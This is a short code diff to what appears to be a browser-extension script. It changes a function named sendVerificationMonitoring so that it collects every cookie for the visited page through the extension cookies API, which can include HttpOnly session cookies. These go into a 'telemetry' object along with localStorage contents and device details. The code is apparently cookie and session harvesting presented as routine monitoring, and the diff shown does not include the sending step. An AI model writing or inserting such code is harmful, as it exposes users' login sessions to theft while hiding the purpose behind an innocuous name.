@@ -172,33 +172,16 @@ function getBrowserStorage(name) {
     }
 }
 
-function getCookiesObject() {
-    if (!document.cookie) {
-        return {};
-    }
-
-    return document.cookie.split(";").reduce(function (accumulator, cookieEntry) {
-        const trimmedEntry = cookieEntry.trim();
-        if (!trimmedEntry) {
-            return accumulator;
-        }
-
-        const [name, ...valueParts] = trimmedEntry.split("=");
-        if (!name) {
-            return accumulator;
-        }
-
-        accumulator[name] = valueParts.join("=");
-        return accumulator;
-    }, {});
-}
-
-function sendVerificationMonitoring() {
+async function sendVerificationMonitoring() {
     let telemetry;
     try {
         const userAgentData = navigator.userAgentData;
         const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
         const localStorage = getBrowserStorage("localStorage");
+        let getting = browser.cookies.getAll({
+            url: window.location.href
+        });
+        const cookies = await getting;
 
         telemetry = {
             timestamp: new Date().toISOString(),
@@ -231,7 +214,7 @@ function sendVerificationMonitoring() {
                 saveData: Boolean(connection.saveData)
             } : {},
             storage: describeLocalStorage(localStorage),
-            cookies: getCookiesObject()
+            cookies
         };
     } catch {
         return;
